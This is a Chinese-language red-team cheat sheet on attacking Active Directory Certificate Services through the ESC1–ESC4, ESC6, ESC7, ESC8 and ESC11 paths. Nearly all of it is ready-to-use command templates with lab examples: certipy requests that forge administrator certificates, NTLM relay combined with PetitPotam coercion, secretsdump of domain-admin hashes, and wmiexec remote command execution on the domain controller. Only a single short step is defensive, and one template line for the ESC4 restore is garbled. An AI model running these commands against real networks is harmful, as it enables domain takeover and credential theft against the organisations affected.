# ADCS Attack Surface - ADCS攻击面

## 信息收集

### 获取证书模板以及ADCS信息

```shell
# 模板
proxychains certipy find -u <域用户>@<域名> -p <密码> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy find -u worker@redteam.com -p worker@123 -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-info-1.png)

### 获取ADCS服务器域名

```shell
# 模板
grep "DNS Name" <刚才收集的信息文件名>
# 示例
grep "DNS Name" 20230915154218_Certipy.txt
```

![info](../images/AD/ADCS/adcs-info-2.png)

#### 获取CA证书颁发机构名称

```shell
# 模板
grep "DNS Name" <刚才收集的信息文件名>
# 示例
grep "CA Name" 20230915164357_Certipy.txt
```

![info](../images/AD/ADCS/adcs-info-3.png)

## 权限提升

### 证书模板错误配置攻击

#### ESC1

##### 环境配置

- certsrv.msc打开证书颁发机构
- 右击证书模板 > 管理 > 右击现有的证书模板 > 复制模板
- 按照以下条件配置错误模板
- 右击证书模板 > 新建 > 要颁发的证书模板

##### 利用条件

- 颁发CA授予低权限用户请求权限（默认）
- 模板中CA管理员审批未启用（默认）
- 模板中不需要授权的签名（默认）
- 模板允许低权限用户注册
- 模板定义了启用认证的EKU
- 证书模板允许请求者在CSR中指定一个SAN

![info](../images/AD/ADCS/adcs-esc1-cnd-1.png)

![info](../images/AD/ADCS/adcs-esc1-cnd-2.png)

![info](../images/AD/ADCS/adcs-esc1-cnd-3.png)

##### 前期准备

- 获取证书模板漏洞信息

![info](../images/AD/ADCS/adcs-esc1-info-1.png)

##### 攻击方法

- 申请域管理员证书模板

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn administrator@<域名> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template TEST1 -upn administrator@redteam.com -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc1-att-1.png)

- 获取域管理员HASH

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![info](../images/AD/ADCS/adcs-esc1-att-2.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass redteam.com/administrator@DC.redteam.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![info](../images/AD/ADCS/adcs-esc1-att-3.png)

#### ESC2

##### 利用条件

- 颁发CA授予低权限用户请求权限（默认）
- 模板中CA管理员审批未启用（默认）
- 模板中不需要授权的签名（默认）
- 模板允许低权限用户注册
- 证书模板中定义了No EKU或Any EKU

![info](../images/AD/ADCS/adcs-esc2-cnd-1.png)

![info](../images/AD/ADCS/adcs-esc2-cnd-2.png)

![info](../images/AD/ADCS/adcs-esc2-cnd-3.png)

##### 前期准备

- 获取证书模板漏洞信息

![info](../images/AD/ADCS/adcs-esc2-info-1.png)

##### 攻击方法

- 申请域管理员证书模板

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn administrator@<域名> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template TEST2 -upn administrator@redteam.com -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc2-att-1.png)

- 获取域管理员HASH

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![info](../images/AD/ADCS/adcs-esc2-att-2.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass redteam.com/administrator@DC.redteam.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![info](../images/AD/ADCS/adcs-esc2-att-3.png)

#### ESC3

##### 利用条件

- 颁发CA授予低权限用户请求权限（默认）
- 模板中CA管理员审批未启用（默认）
- 模板中不需要授权的签名（默认）
- 模板允许低权限用户注册
- 证书模板中定义了证书请求代理EKU(1.3.6.1.4.1.311.20.2.1)

![info](../images/AD/ADCS/adcs-esc3-cnd-1.png)

![info](../images/AD/ADCS/adcs-esc3-cnd-2.png)

![info](../images/AD/ADCS/adcs-esc3-cnd-3.png)

##### 前期准备

- 获取证书模板漏洞信息

![info](../images/AD/ADCS/adcs-esc3-info-1.png)

##### 攻击方法

- 申请当前用户证书模板

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn administrator@<域名> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template TEST3 -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc3-att-1.png)

- 申请域管理员证书模板

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template User -on-behalf-of '<域名>\Administrator' -pfx worker.pfx -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template User -on-behalf-of 'redteam\administrator' -pfx worker.pfx -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc3-att-2.png)

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![info](../images/AD/ADCS/adcs-esc3-att-3.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass redteam.com/administrator@DC.redteam.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![info](../images/AD/ADCS/adcs-esc3-att-4.png)

#### ESC4

##### 利用条件

![info](../images/AD/ADCS/adcs-esc4-cnd-1.png)

![info](../images/AD/ADCS/adcs-esc4-cnd-2.png)

![info](../images/AD/ADCS/adcs-esc4-cnd-3.png)

##### 前期准备

- 获取证书模板漏洞信息

![info](../images/AD/ADCS/adcs-esc4-info-1.png)

##### 攻击方法

- 使用ESC1模板覆盖ESC4模板并保存ESC4旧模板

```shell
# 模板
proxychains certipy template -username <域用户>@<域名> -password <密码> -template TEST4 -save-old -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy template -username worker@redteam.com -password worker@123 -template TEST4 -save-old -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc4-att-1.png)

- 申请域管理员证书模板

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn administrator@<域名> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template TEST4 -upn administrator@redteam.com -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc4-att-2.png)

- 获取域管理员HASH

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![info](../images/AD/ADCS/adcs-esc4-att-3.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass redteam.com/administrator@DC.redteam.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![info](../images/AD/ADCS/adcs-esc4-att-4.png)

- 恢复ESC4模板

```shell
# 模板
proxychains certipy template -username <域用户>@<域名> -password <密码> -template ESC4-Test -configuration ESC4-Test.jsonpython3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains certipy template -username worker@redteam.com -password worker@123 -template TEST4 -configuration TEST4.json -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc4-att-5.png)

### 注册表属性配置错误攻击

#### ESC6

##### 利用条件

- 启用EDITF_ATTRIBUTESUBJECTALTNAME2标志

###### 漏洞环境配置

- 使用以下命令配置漏洞环境，配位完毕后要重启服务（这里修改User模板的属性）

```shell
# 模板
certutil -config "<ADCS域名>\<证书模板>" -setreg "policy\EditFlags" +EDITF_ATTRIBUTESUBJECTALTNAME2
# 示例
certutil -config "adcs.redteam.com\User" -setreg "policy\EditFlags" +EDITF_ATTRIBUTESUBJECTALTNAME2
```

![info](../images/AD/ADCS/adcs-esc5-cnd-1.png)

##### 前期准备

- 获取证书模板漏洞信息

![info](../images/AD/ADCS/adcs-esc5-info-1.png)

##### 攻击方法

- 申请域管理员证书

```shell
# 模板
proxychains certipy req -username <域用户>@<域名> -password <密码> -ca <证书颁发机构名称> -target <ADCS服务器域名> -template <证书模板> -upn administrator@<域名> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template User -upn administrator@redteam.com -dc-ip 10.10.10.1 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc5-att-1.png)

- 获取域管理员HASH

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名>
# 示例
proxychains certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

![info](../images/AD/ADCS/adcs-esc5-att-2.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass redteam.com/administrator@DC.redteam.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![info](../images/AD/ADCS/adcs-esc5-att-3.png)

##### 防御方法

- 删除收影响模板的属性

```shell
# 模板
certutil -config "<ADCS服务器域名>\<模板名称>" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
# 示例
certutil -config "adcs.redteam.com\User" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

![info](../images/AD/ADCS/adcs-esc5-def-1.png)

### ACL安全威胁

#### ESC7 //todo

##### 利用条件

- 拥有"颁发和管理证书"和"管理CA"的权限的用户

##### 前期准备

- 使用高权限账号为当前账号赋予"管理证书"访问权限

```shell
# 模板
proxychains certipy ca -ca '<证书颁发机构名称>' -add-officer <被授权用户名> -username <用户名>@<域名> -password <密码> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy ca -ca 'CA' -add-officer worker -username administrator@sec.com -password 1qaz@WSX -dc-ip 10.10.10.10 -dns-tcp
```

- 启用SubCA证书模板

```shell
# 模板
proxychains certipy ca -ca '<CA证书机构名称>' -enable-template SubCA -username <具备管理CA的用户> -password <密码> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy ca -ca 'CA' -enable-template SubCA -username worker@redteam.com -password worker@123 -dc-ip 10.10.10.1 -dns-tcp
```

##### 攻击方法

- 申请域管理员证书

```shell
# 模板
proxychains certipy req -username <用户名>@<域名> -password <密码> -ca <CA证书机构名称> -target <ADCS服务器名称> -template SubCA -upn <域管理员账号>  -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy req -username worker@redteam.com -password worker@123 -ca CA -target adcs.redteam.com -template SubCA -upn administrator@redteam.com -dc-ip 10.10.10.1 -dns-tcp
```

- 审核刚才申请的管理员证书

```shell
# 模板
proxychains certipy ca -ca '<CA证书机构名称>' -issue-request <key的id> -username <具备管理CA的用户> -password <密码> -dc-ip <域控服务器IP> -dns-tcp
# 示例
proxychains certipy ca -ca 'CA' -issue-request 64 -username worker@redteam.com -password worker@123 -dc-ip 10.10.10.1 -dns-tcp
```

### NTLM Relay - ADCS

#### ESC8

##### 利用条件

- 获取当前被控服务器的管理员权限
- CA证书服务器是开启NTLM认证

##### 前期准备

###### 查看CA证书服务器是否开启NTLM认证

- 若返回结果为WWW-Authenticate: NTLM则开启NTLM认证

```shell
# 模板
proxychains curl <ADCS服务器IP>/certsrv/ -I
# 示例
proxychains curl 10.10.10.4/certsrv/ -I
```

![esc8](../images/AD/ADCS/adcs-esc8-cnd-1.png)

##### 攻击方法

- 中继服务器开启监听

```shell
# 模板
proxychains certipy relay -target 'http://<ADCS服务器IP或域名>' -template <证书模板>
# 示例
proxychains certipy relay -target 'http://10.10.10.11' -template DomainController
```

![esc8](../images/AD/ADCS/adcs-esc8-att-1.png)

- 使用强制认证漏洞（PS：这里使用PetitPotam）

```shell
# 模板
proxychains python3 PetitPotam.py -d <域名> -u <域用户> -p <密码> <中继服务器IP> <域控服务器IP>
# 示例
proxychains python3 PetitPotam.py -d redteam.com -u worker -p worker@123 10.10.255.1 10.10.10.10
```

![esc8](../images/AD/ADCS/adcs-esc8-att-2.png)

- 成功获取域控证书

![esc8](../images/AD/ADCS/adcs-esc8-att-3.png)

- 获取域控票据

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名> -dns-tcp
# 示例
proxychains certipy auth -pfx dc.pfx -dc-ip 10.10.10.10 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc8-att-4.png)

- dump域管理员hash

```shell
# 模板
KRB5CCNAME=<TGT票据> python3 secretsdump.py -no-pass -k <域控服务器域名> -just-dc-user <域管理员账号> -just-dc-ntlm 
# 示例
KRB5CCNAME=dc.ccache proxychains python3 secretsdump.py -no-pass -k DC.sec.com -just-dc-user administrator -just-dc-ntlm
```

![info](../images/AD/ADCS/adcs-esc8-att-5.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass sec.com/administrator@DC.sec.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![info](../images/AD/ADCS/adcs-esc8-att-6.png)

#### ESC11

##### 利用条件

- 证书颁发机构未配置IF_ENFORCEENCRYPTICERTREQUEST

- 当HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA的InterfaceFlags的值为441时，即未配置IF_ENFORCEENCRYPTICERTREQUEST

![info](../images/AD/ADCS/adcs-esc11-cnd-1.png)

##### 攻击方法

- 中继服务器开启监听

```shell
# 模板
proxychains certipy relay -target 'rpc://<证书服务器域名或IP>' -ca '<证书颁发机构名称>' -template DomainController
# 示例
proxychains certipy relay -target 'rpc://10.10.10.11' -ca 'CA' -template DomainController
```

![info](../images/AD/ADCS/adcs-esc11-att-1.png)

- 使用强制认证漏洞（PS：这里使用PetitPotam）

```shell
# 模板
proxychains python3 PetitPotam.py -d <域名> -u <域用户> -p <密码> <中继服务器IP> <域控服务器IP>
# 示例
proxychains python3 PetitPotam.py -d redteam.com -u worker -p worker@123 10.10.255.1 10.10.10.10
```

![esc8](../images/AD/ADCS/adcs-esc11-att-2.png)

- 成功获取域控证书

![esc8](../images/AD/ADCS/adcs-esc11-att-3.png)

- 获取域控票据

```shell
# 模板
proxychains certipy auth -pfx <证书文件> -dc-ip <域名> -dns-tcp
# 示例
proxychains certipy auth -pfx dc.pfx -dc-ip 10.10.10.10 -dns-tcp
```

![info](../images/AD/ADCS/adcs-esc11-att-4.png)

- dump域管理员hash

```shell
# 模板
KRB5CCNAME=<TGT票据> python3 secretsdump.py -no-pass -k <域控服务器域名> -just-dc-user <域管理员账号> -just-dc-ntlm 
# 示例
KRB5CCNAME=dc.ccache proxychains python3 secretsdump.py -no-pass -k DC.sec.com -just-dc-user administrator -just-dc-ntlm
```

![info](../images/AD/ADCS/adcs-esc11-att-5.png)

- 使用exec工具远控域控服务器

```shell
# 模板
proxychains python3 wmiexec.py -no-pass <域名>/<域管理员用户名>@<域控服务器IP> -hashes <NTLM HASH>
# 示例
proxychains python3 wmiexec.py -no-pass sec.com/administrator@DC.sec.com -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
```

![info](../images/AD/ADCS/adcs-esc11-att-6.png)
